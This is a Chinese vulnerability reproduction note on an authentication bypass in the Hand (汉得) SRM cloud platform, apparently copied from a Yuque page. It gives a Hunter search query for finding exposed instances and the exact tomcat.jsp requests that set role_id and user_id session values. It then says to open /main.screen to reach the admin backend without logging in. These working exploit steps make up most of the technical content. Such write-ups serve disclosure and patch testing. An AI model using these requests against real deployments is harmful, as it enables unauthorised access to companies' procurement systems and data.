# 汉得SRM tomcat.jsp 登录绕过漏洞

# 一、漏洞简介
汉得SRM云是面向企业采购流程信息化建设的完整解决方案。基于汉得供应商关系管理体系在战略寻源与集中采购、供应链协同和优益采购三大采购管理领域的成功实践，形成了深度契合业务实体的三项组件级解决方案。汉得SRM tomcat.jsp 存在登录绕过漏洞，可绕过身份认证登录后台。

# 二、影响版本
+ 汉得 SRM云平台（Going-Link）

# 三、资产测绘
+ hunter：`app.name="汉得 SRM Going-Link"`

![1691633444395-128795bc-eda8-404c-956d-8147631e5f4f.png](./img/zp0A_yg2AV9HVCoP/1691633444395-128795bc-eda8-404c-956d-8147631e5f4f-852592.png)

+ 登录页面

![1691633633657-ce37893e-1008-4ebd-ba12-5829debf3f3a.png](./img/zp0A_yg2AV9HVCoP/1691633633657-ce37893e-1008-4ebd-ba12-5829debf3f3a-412386.png)

# 四、漏洞复现
1. 访问`tomct.jsp`

```java
/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1
```

![1691634374117-f33fbea4-fb74-4443-a8a1-077e4fa58158.png](./img/zp0A_yg2AV9HVCoP/1691634374117-f33fbea4-fb74-4443-a8a1-077e4fa58158-644860.png)

![1691634393767-677fb789-042e-4e9a-ab69-69f7ba82f2d0.png](./img/zp0A_yg2AV9HVCoP/1691634393767-677fb789-042e-4e9a-ab69-69f7ba82f2d0-860506.png)

2. 然后访问后台`<font style="color:rgba(0, 0, 0, 0.9);">/main.screen</font>`

![1691634449862-e80411bc-7175-4b3b-b099-744552207362.png](./img/zp0A_yg2AV9HVCoP/1691634449862-e80411bc-7175-4b3b-b099-744552207362-749194.png)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kb4n0lalk008g50l>